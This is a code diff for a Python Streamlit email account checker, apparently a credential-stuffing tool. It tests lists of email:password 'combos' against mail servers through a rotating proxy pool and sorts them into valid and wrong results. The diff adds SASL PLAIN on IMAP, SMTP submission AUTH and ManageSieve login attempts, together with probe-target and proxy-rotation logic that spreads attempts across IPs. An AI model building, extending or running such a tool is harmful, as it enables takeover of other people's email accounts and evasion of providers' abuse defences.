 _settings_dirty = build_cfg() != str_lit.session_state.applied_cfg
@@ -2419,7 +2500,7 @@ with _btn_c1:
     _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", use_container_width=True)
 with _btn_c2:
     _reset_clicked = str_lit.button("♻️ Reset Defaults", use_container_width=True,
-                                    help="Restore every setting to the universal default that works for any mix of combos.")
+                                    help="Restore every setting to the universal default (protocols back to IMAP-only).")
 
 if _reset_clicked:
     _reset_all_settings()
@@ -2452,11 +2533,13 @@ for _k, _v in (
     ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
     ("DIRECT_FIRST", False), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
     ("SKIP_STRICT_APP_PROVIDERS", False),
+    ("PROTOCOLS", list(PROTOCOL_SELECTION_DEFAULT)),
 ):
     CFG.setdefault(_k, _v)
 
 log_startup(
-    f"ACTIVE CONFIG -> mode={CFG.get('MODE_NAME')} workers={CFG.get('MAX_WORKERS_START')} "
+    f"ACTIVE CONFIG -> protocols={CFG.get('PROTOCOLS')} mode={CFG.get('MODE_NAME')} "
+    f"workers={CFG.get('MAX_WORKERS_START')} "
     f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
     f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
     f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
@@ -2660,12 +2743,7 @@ def _dedupe_hosts_by_ip(hosts, cap=3):
     return out
 
 def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
-    """Open a tunnel.  v13.30: this is ALWAYS a proxy hop.
-
-    The old inline direct fallback returned a DIRECT socket while the caller
-    stamped a proxy tag and credited the node - so a "proxied" success could be
-    a direct one.  The phase logic owns direct now; this raises instead.
-    """
+    """Open a tunnel.  v13.30: this is ALWAYS a proxy hop."""
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
     try:
         with proxy_lock:
@@ -2810,6 +2888,221 @@ def pop3_ok(resp):
         return len(resp) >= 1
     return True
 
+# ---------------------------------------------------------------------------
+# v13.31: SASL PLAIN ON IMAP
+# ---------------------------------------------------------------------------
+# imaplib.login() only ever sends the LOGIN command.  Servers that disable it
+# (LOGINDISABLED, or an AUTH=PLAIN-without-AUTH=LOGIN policy) were unreachable.
+
+def _imap_wants_plain(mail) -> bool:
+    caps = getattr(mail, "capabilities", None)
+    joined = b" ".join(caps).upper() if caps else b""
+    if b"LOGINDISABLED" in joined:
+        return True
+    if b"AUTH=PLAIN" in joined and b"AUTH=LOGIN" not in joined:
+        return True
+    if joined in (b"", b"IMAP4REV1"):
+        # the greeting carried no capability list - ask once
+        try:
+            typ, dat = mail.capability()
+            if typ == "OK":
+                j2 = b" ".join(dat or []).upper()
+                return (b"LOGINDISABLED" in j2) or (b"AUTH=PLAIN" in j2 and b"AUTH=LOGIN" not in j2)
+        except Exception:
+            return False
+    return False
+
+def _imap_authenticate_plain(mail, user, password):
+    payload = base64.b64encode(f"\0{user}\0{password}".encode()).decode()
+    typ, data = mail.authenticate("PLAIN", lambda _c: payload.encode())
+    if typ != "OK":
+        raise RuntimeError(f"IMAP AUTHENTICATE PLAIN returned non-OK status: {typ} {data}")
+
+def _imap_auth(mail, user, password):
+    """LOGIN, or AUTHENTICATE PLAIN when the server disables LOGIN (v13.31)."""
+    if _imap_wants_plain(mail):
+        _imap_authenticate_plain(mail, user, password)
+        return
+    typ, data = mail.login(user.strip(), password.strip())
+    if typ != 'OK':
+        raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
+
+# ---------------------------------------------------------------------------
+# v13.31: SMTP SUBMISSION AUTH  (CONFIRM-ONLY)
+# ---------------------------------------------------------------------------
+_HELO_STATE = STATE["helo_name"]
+
+def smtp_helo_name() -> str:
+    now = time.time()
+    if _HELO_STATE.get("name") and now - _HELO_STATE.get("ts", 0.0) < 3600:
+        return _HELO_STATE["name"]
+    with STATE["helo_lock"]:
+        if _HELO_STATE.get("name") and time.time() - _HELO_STATE.get("ts", 0.0) < 3600:
+            return _HELO_STATE["name"]
+        name = ""
+        try:
+            name = socket.getfqdn() or ""
+        except Exception:
+            name = ""
+        if "." not in name:
+            ip = public_ip()
+            if ip and ip != "Unknown":
+                name = f"[{ip}]"
+        if not name:
+            name = "localhost"
+        _HELO_STATE.update(name=name, ts=time.time())
+        return name
+
+def _smtp_read_reply(sock, limit=24) -> str:
+    lines = []
+    for _ in range(limit):
+        buf = b""
+        while not buf.endswith(b"\n"):
+            try:
+                chunk = sock.recv(1)
+            except Exception:
+                chunk = b""
+            if not chunk:
+                break
+            buf += chunk
+        if not buf:
+            break
+        text = buf.decode("utf-8", errors="ignore").rstrip("\r\n")
+        lines.append(text)
+        if len(text) >= 4 and text[3] == "-":
+            continue
+        break
+    return "\n".join(lines)
+
+def _smtp_cmd(sock, cmd, quiet=False) -> str:
+    try:
+        sock.sendall((cmd + "\r\n").encode())
+    except Exception:
+        if not quiet:
+            raise
+        return ""
+    try:
+        return _smtp_read_reply(sock)
+    except Exception:
+        if quiet:
+            return ""
+        raise
+
+def smtp_auth_once(email, password, server, proxy_str=None, insecure=True, port=587,
+                   attempt_timeout=None, user=None):
+    """Confirm-only SMTP submission AUTH.
+
+    Raises SmtpAuthError ONLY on a clean 535 (credential rejection).
+    Raises SmtpSoftError for anything that says nothing about the password
+    (530 Authentication Required, relay restrictions, 504 unrecognised
+    mechanism, 4xx greylist).  Never raises anything that could be read as a
+    transport failure - that is left to _raw_socket/ProxyTransportError.
+    """
+    to = attempt_timeout or CFG["TIMEOUT"]
+    s = None
+    try:
+        s = _raw_socket(server, port, proxy_str, timeout=to)
+        if int(port) == 465:
+            s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
+        s.settimeout(max(READ_FLOOR_MIN, float(to)))
+
+        banner = _smtp_read_reply(s)
+        if not banner.startswith("220"):
+            raise SmtpSoftError(f"banner not 220: {banner[:60]!r}")
+
+        ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
+        caps = ehlo.upper()
+        if "STARTTLS" in caps and int(port) != 465:
+            r = _smtp_cmd(s, "STARTTLS")
+            if r.startswith("220"):
+                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
+                s.settimeout(max(READ_FLOOR_MIN, float(to)))
+                ehlo = _smtp_cmd(s, f"EHLO {smtp_helo_name()}")
+                caps = ehlo.upper()
+        if "AUTH" not in caps:
+            raise SmtpSoftError("server does not advertise AUTH")
+
+        who = (user or email).strip()
+        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()
+
+        r = _smtp_cmd(s, f"AUTH PLAIN {payload}")
+        if r.startswith("334"):
+            r = _smtp_cmd(s, payload)
+
+        low = r.lower()
+        if r.startswith("504") or "unrecognized" in low or "not supported" in low:
+            # server has no PLAIN - fall back to AUTH LOGIN
+            r2 = _smtp_cmd(s, "AUTH LOGIN")
+            if r2.startswith("334"):
+                _smtp_cmd(s, base64.b64encode(who.encode()).decode())
+                r = _smtp_cmd(s, base64.b64encode(password.encode()).decode())
+            else:
+                r = r2
+            low = r.lower()
+
+        if r.startswith("235"):
+            return True
+        if (r.startswith("535") or "authentication failed" in low
+                or "invalid credentials" in low or "username and password not accepted" in low):
+            raise SmtpAuthError(f"SMTP AUTH rejected: {r[:90]}")
+        raise SmtpSoftError(f"SMTP AUTH inconclusive: {r[:90]}")
+    finally:
+        if s is not None:
+            try:
+                _smtp_cmd(s, "QUIT", quiet=True)
+            except Exception:
+                pass
+            try:
+                s.close()
+            except Exception:
+                pass
+
+# ---------------------------------------------------------------------------
+# v13.31: MANAGESIEVE  (CONFIRM-ONLY)
+# ---------------------------------------------------------------------------
+def sieve_auth_once(email, password, server, proxy_str=None, insecure=True, port=SIEVE_PORT,
+                    attempt_timeout=None, user=None):
+    """Confirm-only ManageSieve (RFC 5804) AUTH.  Same credentials, port 4190."""
+    to = attempt_timeout or CFG["TIMEOUT"]
+    s = None
+    try:
+        s = _raw_socket(server, port, proxy_str, timeout=to)
+        s.settimeout(max(READ_FLOOR_MIN, float(to)))
+        greet = s.recv(600).decode("utf-8", errors="ignore")
+        if not greet:
+            raise SieveSoftError("no ManageSieve greeting")
+        up = greet.upper()
+        if "SIEVE" not in up and "IMPLEMENTATION" not in up:
+            raise SieveSoftError(f"not a ManageSieve greeting: {greet[:60]!r}")
+        if "STARTTLS" in up:
+            s.sendall(b"STARTTLS\r\n")
+            r = s.recv(300).decode("utf-8", errors="ignore")
+            if r.startswith("OK"):
+                s = _tls_context(server, verify=not insecure).wrap_socket(s, server_hostname=server)
+                s.settimeout(max(READ_FLOOR_MIN, float(to)))
+                s.recv(600)     # post-TLS capability list
+        who = (user or email).strip()
+        payload = base64.b64encode(f"\0{who}\0{password}".encode()).decode()
+        s.sendall(f'AUTHENTICATE "PLAIN" "{payload}"\r\n'.encode())
+        r = s.recv(600).decode("utf-8", errors="ignore")
+        up = r.upper()
+        if up.startswith("OK"):
+            return True
+        if (up.startswith("NO") or "AUTHENTICATIONFAILED" in up
+                or "INVALID" in up or "AUTHENTICATION FAILED" in up):
+            raise SieveAuthError(f"ManageSieve AUTH rejected: {r[:90]}")
+        raise SieveSoftError(f"ManageSieve inconclusive: {r[:90]}")
+    finally:
+        if s is not None:
+            try:
+                s.sendall(b"LOGOUT\r\n")
+            except Exception:
+                pass
+            try:
+                s.close()
+            except Exception:
+                pass
+
 # ============================================================================
 # ERROR CLASSIFICATION
 # ============================================================================
@@ -2862,7 +3155,7 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_au
         warnings.warn(f"Error recording proxy attempt: {e}")
 
 # ============================================================================
-# SMTP PRE-CHECK
+# SMTP PRE-CHECK  (reachability banner only - never authenticates)
 # ============================================================================
 
 def _smtp_banner_ok(hosts, px, timeout=3.5):
@@ -2995,6 +3288,21 @@ def smtp_failed_check(domain, px, trace_logs):
         return False
     trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
     return None
+
+def _smtp_hosts_for(domain, cap=SMTP_HOST_CAP):
+    """First SMTP submission host, preferring an explicit smtp.<domain>."""
+    try:
+        hosts = [h for h in (host_smtp_candidates(domain) or []) if h]
+    except Exception:
+        hosts = []
+    if not hosts:
+        return []
+    if not hosts[0].lower().startswith("smtp"):
+        for i, h in enumerate(hosts):
+            if h.lower().startswith("smtp"):
+                hosts.insert(0, hosts.pop(i))
+                break
+    return hosts[:cap]
 
 # ============================================================================
 # PROXY HEALTH / POOL SAMPLING
@@ -3331,12 +3639,31 @@ def start_alive_refresher():
 
 start_alive_refresher()
 
+def _probe_pair_for(email, domain, flags):
+    """v13.31: the AUTO probe target follows the SELECTED protocols."""
+    if flags.get("imap"):
+        h = (get_servers(email).get("imap") or [])[:1]
+        if h:
+            return (h[0], 993)
+    if flags.get("pop"):
+        h = (get_servers(email).get("pop") or [])[:1]
+        if h:
+            return (h[0], 995)
+    if flags.get("smtp"):
+        h = _smtp_hosts_for(domain)
+        if h:
+            return (h[0], 587)
+    if flags.get("sieve"):
+        h = (get_servers(email).get("imap") or [])[:1]
+        if h:
+            return (h[0], SIEVE_PORT)
+    return None
+
 def _set_probe_targets_from_queue(accounts, cap=3):
     """v13.30: resolve the AUTO probe target from the ACTUAL queue.
-
-    A node is then admitted on whether it can reach the hosts this run will
-    actually dial.  A node passes if ANY of the (max 3) targets connects.
+    v13.31: and from the SELECTED protocols.
     """
+    flags = protocol_flags()
     out, seen_domains, seen_pairs = [], set(), set()
     for raw in accounts or []:
         em = raw.split(":", 1)[0].strip().lower()
@@ -3347,17 +3674,15 @@ def _set_probe_targets_from_queue(accounts, cap=3):
             continue
         seen_domains.add(dom)
         try:
-            hosts = (get_servers(em).get("imap") or [])[:1]
+            pair = _probe_pair_for(em, dom, flags)
         except Exception:
-            hosts = []
-        for h in hosts:
-            if not h:
-                continue
-            key = (h, 993)
-            if key in seen_pairs:
-                continue
-            seen_pairs.add(key)
-            out.append((h, 993, f"auto:{dom}"))
+            pair = None
+        if not pair:
+            continue
+        if pair in seen_pairs:
+            continue
+        seen_pairs.add(pair)
+        out.append((pair[0], pair[1], f"auto:{dom}"))
         if len(out) >= cap:
             break
     if out:
@@ -3419,6 +3744,7 @@ with str_lit.sidebar:
         + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
     )
     str_lit.caption(f"Probe targets in use: {', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
+    str_lit.caption(f"Protocols dialled: **{' + '.join(active_protocols())}**")
 
     _tr = _probe_target_reachability()
     _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
@@ -4303,9 +4629,7 @@ def imap_once(email, password, server, proxy_str=None, insecure=True, port=993, 
     mail = None
     try:
         mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
-        typ, data = mail.login(email.strip(), password.strip())
-        if typ != 'OK':
-            raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
+        _imap_auth(mail, email, password)
         st_typ, st_data = mail.select("INBOX", readonly=True)
         if st_typ != 'OK':
             raise RuntimeError(f"IMAP post-auth inbox select failed (possible proxy spoofing): {st_typ} {st_data}")
@@ -4326,9 +4650,7 @@ def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, p
     try:
         mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
         mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
-        typ, data = mail.login(email.strip(), password.strip())
-        if typ != 'OK':
-            raise RuntimeError(f"IMAP STARTTLS login returned non-OK status: {typ} {data}")
+        _imap_auth(mail, email, password)
         st_typ, st_data = mail.select("INBOX", readonly=True)
         if st_typ != 'OK':
             raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
@@ -4348,9 +4670,7 @@ def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_t
     mail = None
     try:
         mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
-        typ, data = mail.login(email.strip(), password.strip())
-        if typ != 'OK':
-            raise RuntimeError(f"IMAP plain login returned non-OK status: {typ} {data}")
+        _imap_auth(mail, email, password)
         st_typ, st_data = mail.select("INBOX", readonly=True)
         if st_typ != 'OK':
             raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
@@ -4461,11 +4781,10 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                         mail.starttls(ssl_context=_tls_context(h, False))
                     else:
                         mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
-                    typ, _ = mail.login(user.strip(), target_pass.strip())
-                    if typ == 'OK':
-                        st_typ, _ = mail.select("INBOX", readonly=True)
-                        if st_typ == 'OK':
-                            return True, mail, h
+                    _imap_auth(mail, user, target_pass)
+                    st_typ, _ = mail.select("INBOX", readonly=True)
+                    if st_typ == 'OK':
+                        return True, mail, h
                     try:
                         mail.logout()
                     except Exception:
@@ -4556,6 +4875,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
         same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))
 
+        # ---- v13.31: which protocols are we allowed to dial? ----------------
+        flags_p = protocol_flags()
+        allow_imap = flags_p["imap"]
+        allow_pop = flags_p["pop"]
+        allow_smtp = flags_p["smtp"]
+        allow_sieve = flags_p["sieve"]
+        if not (allow_imap or allow_pop or allow_smtp or allow_sieve):
+            allow_imap = True
+
         users = username_candidates(email) if try_alt_user else [email]
         primary_user = users[0]
 
@@ -4586,10 +4914,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
         _pop_only = [h for h in _all_pop if h not in imap_hosts]
         pop_hosts = (_pop_only or _all_pop)[:1]
+        _smtp_hosts = _smtp_hosts_for(domain) if allow_smtp else []
         if len(_all_imap) > len(imap_hosts):
             trace_logs.append(
                 f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
                 f"(cap {_imap_cap}, duplicate IPs collapsed).")
+        if allow_smtp and not _smtp_hosts:
+            trace_logs.append("SMTP is selected but no SMTP submission host was discovered for this domain.")
 
         if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
             imap_hosts = imap_hosts + [domain]
@@ -4623,11 +4954,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     return True
             return False
 
-        domain_local_hosts = {h for h in (imap_hosts + pop_hosts) if _is_local_host(h)}
+        domain_local_hosts = {h for h in (imap_hosts + pop_hosts + _smtp_hosts) if _is_local_host(h)}
 
         tried_hosts = set()
 
-        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts}")
+        trace_logs.append(
+            f"Protocols selected -> {' + '.join(active_protocols())} "
+            f"(SMTP/ManageSieve are CONFIRM-ONLY: a failure never lowers a verdict).")
+        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts} | SMTP {_smtp_hosts}")
         if proxy_pool and proxy_mode != "off":
             trace_logs.append(
                 f"Proxy pool: {len(proxy_pool)} node(s) alive, {quarantine_size()} quarantined for 407.")
@@ -4637,10 +4971,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             f"· same-host retries {same_host_retries} · rotation "
             f"{'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")
 
-        resolvable = [h for h in (imap_hosts + pop_hosts) if fast_fail_dns_check(h)]
+        resolvable = [h for h in (imap_hosts + pop_hosts + _smtp_hosts) if fast_fail_dns_check(h)]
         dns_ok = bool(resolvable)
         if dns_ok:
-            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/{len(imap_hosts) + len(pop_hosts)} hosts resolve locally")
+            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/{len(imap_hosts) + len(pop_hosts) + len(_smtp_hosts)} hosts resolve locally")
         else:
             trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
             if not proxy_pool or proxy_mode == "off":
@@ -4650,25 +4984,37 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         pop_only = [h for h in pop_hosts if h not in imap_set]
         pop_dup = [h for h in pop_hosts if h in imap_set]
 
+        # ---- ladder: only the SELECTED protocols get a rung ------------------
         primary_plan = []
-        if imap_hosts:
-            primary_plan.append(("IMAP", imap_hosts[0], 993, "ssl"))
-        for _ph in pop_only:
-            primary_plan.append(("POP", _ph, 995, "ssl"))
-        for _h in imap_hosts[1:]:
-            primary_plan.append(("IMAP", _h, 993, "ssl"))
+        if allow_imap and imap_hosts:
+            primary_plan.append((RUNG_IMAP, imap_hosts[0], 993, "ssl"))
+        if allow_pop:
+            for _ph in pop_only:
+                primary_plan.append((RUNG_POP, _ph, 995, "ssl"))
+        if allow_imap:
+            for _h in imap_hosts[1:]:
+                primary_plan.append((RUNG_IMAP, _h, 993, "ssl"))
+        if allow_smtp:
+            for _sh in _smtp_hosts:
+                for _sp, _sm in SMTP_RUNG_PORTS:
+                    primary_plan.append((RUNG_SMTP, _sh, _sp, _sm))
+        if allow_sieve and imap_hosts:
+            primary_plan.append((RUNG_SIEVE, imap_hosts[0], SIEVE_PORT, "starttls"))
 
-        fallback_plan = [("POP", h, 995, "ssl") for h in pop_dup]
-        if try_starttls:
-            fallback_plan += [("IMAP", h, 143, "starttls") for h in imap_hosts]
-            fallback_plan += [("IMAP", h, 143, "plain") for h in imap_hosts[:2]]
+        fallback_plan = []
+        if allow_pop:
+            fallback_plan += [(RUNG_POP, h, 995, "ssl") for h in pop_dup]
+        if try_starttls and allow_imap:
+            fallback_plan += [(RUNG_IMAP, h, 143, "starttls") for h in imap_hosts]
+            fallback_plan += [(RUNG_IMAP, h, 143, "plain") for h in imap_hosts[:2]]
+        if try_starttls and allow_pop:
             for h in pop_hosts:
-                fallback_plan += [("POP", h, 110, "starttls")]
-                fallback_plan += [("POP", h, 110, "plain")]
+                fallback_plan += [(RUNG_POP, h, 110, "starttls")]
+                fallback_plan += [(RUNG_POP, h, 110, "plain")]
 
         if not primary_plan:
-            trace_logs.append("No candidate hosts for this domain.")
-            return None, FAILED, "no candidate hosts", None, trace_logs
+            trace_logs.append("No candidate hosts for this domain under the selected protocols.")
+            return None, FAILED, "no candidate hosts for the selected protocols", None, trace_logs
 
         rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
         work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
@@ -4694,20 +5040,26 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return "timed out" in s or "timeout" in s
 
         def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
-            if proto == "IMAP":
+            if proto == RUNG_IMAP:
                 if tls_mode == "ssl":
                     imap_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                 elif tls_mode == "starttls":
                     imap_starttls_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                 else:
                     imap_plain_once(user, password, server, px_used, port=port, attempt_timeout=attempt_to)
-            else:
+            elif proto == RUNG_POP:
                 if tls_mode == "ssl":
                     pop_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                 elif tls_mode == "starttls":
                     pop_starttls_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                 else:
                     pop_plain_once(user, password, server, px_used, port=port, attempt_timeout=attempt_to)
+            elif proto == RUNG_SMTP:
+                smtp_auth_once(user, password, server, px_used, insecure=prefer_insecure,
+                               port=port, attempt_timeout=attempt_to)
+            else:
+                sieve_auth_once(user, password, server, px_used, insecure=prefer_insecure,
+                                port=port, attempt_timeout=attempt_to)
 
         def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
             """Serialised per destination host, per proxy IP, and globally."""
@@ -4743,8 +5095,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 return None
             if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                 return None
-            # v13.30: the error is passed EXPLICITLY.  It used to be read from an
-            # enclosing scope that sweep() shadowed, so the gate always saw "".
             if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
                 return None
             try:
@@ -4786,7 +5136,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return bool(pool) and q >= pool
 
         def _rotate_to_fresh(px_used, seen_px, why):
-            """v13.29: shared rotator. Returns (new_px, ok)."""
             newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
             if newpx and newpx not in seen_px:
                 seen_px.add(newpx)
@@ -4880,6 +5229,32 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             server_level_fail = True
                             rotate_now = True
 
+                        # ---- v13.31: CONFIRM-ONLY rungs ------------------
+                        except (SmtpAuthError, SieveAuthError) as cnf:
+                            err_text = str(cnf)
+                            flags["saw_nonproxy"] = True
+                            record_proxy_attempt(px_used, success=False, is_network_error=False)
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> CONFIRM {proto} {server}:{port}: "
+                                f"{err_text[:140]} [Classified: {WRONG} - confirm-only]")
+                            note_verdict(WRONG, f"{proto} {server}:{port} -> {WRONG} (confirm-only)", server)
+                            if u_idx + 1 < len(users):
+                                # SMTP/Sieve usernames are the full address, but a
+                                # legacy front may still want the local part.
+                                continue
+                            server_level_fail = True
+                            rotate_now = False
+
+                        except (SmtpSoftError, SieveSoftError) as soft:
+                            err_text = str(soft)
+                            flags["saw_nonproxy"] = True
+                            record_proxy_attempt(px_used, success=False, is_network_error=False)
+                            trace_logs.append(
+                                f"{px_tag(px_used)} -> INCONCLUSIVE {proto} {server}:{port}: "
+                                f"{err_text[:140]} [no verdict change]")
+                            server_level_fail = True
+                            rotate_now = False
+
                         except ssl.SSLError as ssl_err:
                             err_text = str(ssl_err)
                             st_val = classify_error(ssl_err, domain)
@@ -4922,9 +5297,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     retry_same = True
 
                         except (socket.error, ConnectionRefusedError) as sock_err:
-                            # v13.30: a raw reset ROTATES.  It used to also set
-                            # retry_same, and that branch ran first - so the first
-                            # reset dialled the SAME node and the SAME source IP.
+                            # v13.30: a raw reset ROTATES, it does not reuse the node.
                             err_text = str(sock_err)
                             flags["saw_nonproxy"] = True
                             had_net = True
@@ -4974,7 +5347,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 better = (best_verdict["status"] is not None
                                           and ST_PRIORITY.get(best_verdict["status"], 99) < ST_PRIORITY.get(WRONG, 99))
                                 if not better and (server in domain_local_hosts or not (domain_local_hosts - tried_hosts)):
-                                    return (None, WRONG, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
+                                    return (None, WRONG,
+                                            f"{px_tag(px_used)} {proto} {server} -> {st_val}" + _wrong_detail_note(domain, password),
+                                            px_used, trace_logs), had_net, saw_retry
                                 trace_logs.append(
                                     f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                     f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
@@ -5040,7 +5415,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 better = (best_verdict["status"] is not None
                                           and ST_PRIORITY.get(best_verdict["status"], 99) < ST_PRIORITY.get(WRONG, 99))
                                 if not better and (server in domain_local_hosts or not (domain_local_hosts - tried_hosts)):
-                                    return (None, WRONG, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
+                                    return (None, WRONG,
+                                            f"{px_tag(px_used)} {proto} {server} -> {st_val}" + _wrong_detail_note(domain, password),
+                                            px_used, trace_logs), had_net, saw_retry
                                 trace_logs.append(
                                     f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                     f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
@@ -5198,12 +5575,12 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         _foreign = bool(_bh) and not _is_local_host(_bh)
         detail = best_verdict["detail"] or "retained verdict"
         if _foreign:
-            # v13.30: be explicit when the retained verdict came off a host that
-            # is not this account's own provider.
             detail = f"{detail} [retained via FOREIGN host {_bh}]"
             trace_logs.append(
                 f"NOTE: the retained verdict came from {_bh}, which is not a local host for "
                 f"{domain}. It may belong to a different provider.")
+        if best_verdict["status"] == WRONG:
+            detail = detail + _wrong_detail_note(domain, password)
         trace_logs.append(
             f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}].")
         return None, best_verdict["status"], detail, None, trace_logs
@@ -5266,7 +5643,8 @@ if start_engine_btn:
 
     log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
     log_startup(
-        f"RUN CONFIG -> workers={CFG.get('MAX_WORKERS_START')} deadline={CFG.get('ACCOUNT_DEADLINE')}s "
+        f"RUN CONFIG -> protocols={CFG.get('PROTOCOLS')} workers={CFG.get('MAX_WORKERS_START')} "
+        f"deadline={CFG.get('ACCOUNT_DEADLINE')}s "
         f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
         f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
         f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
@@ -5311,8 +5689,6 @@ if start_engine_btn:
     else:
         filtered_pool[:] = get_filtered_active_proxies()
 
-        # v13.30: mark the run live, resolve the AUTO probe target from THIS
-        # queue, then force one probe so the pool reflects the real hosts.
         STATE["run_active"] = True
         _tg = _set_probe_targets_from_queue(accounts_to_check)
         if _tg and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
@@ -5680,7 +6056,7 @@ if start_engine_btn:
             except OSError:
                 pass
 
-            hdr = f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration}\n"
+            hdr = f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration} | Protocols: {'+'.join(active_protocols())}\n"
             with file_write_lock:
                 for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                    (need_path, need_snapshot), (failed_path, conn_snapshot),
@@ -5775,6 +6151,9 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         }
 
     str_lit.markdown(f"### {status_label}")
+    str_lit.caption(f"Protocols dialled this run: **{' + '.join(active_protocols())}**"
+                    + ("  ·  SMTP/ManageSieve were CONFIRM-ONLY"
+                       if any(p in ("SMTP", "ManageSieve") for p in active_protocols()) else ""))
 
     if str_lit.session_state.run_completion_status == "Unfinished":
         unfinished_list = list_unfinished_runs()
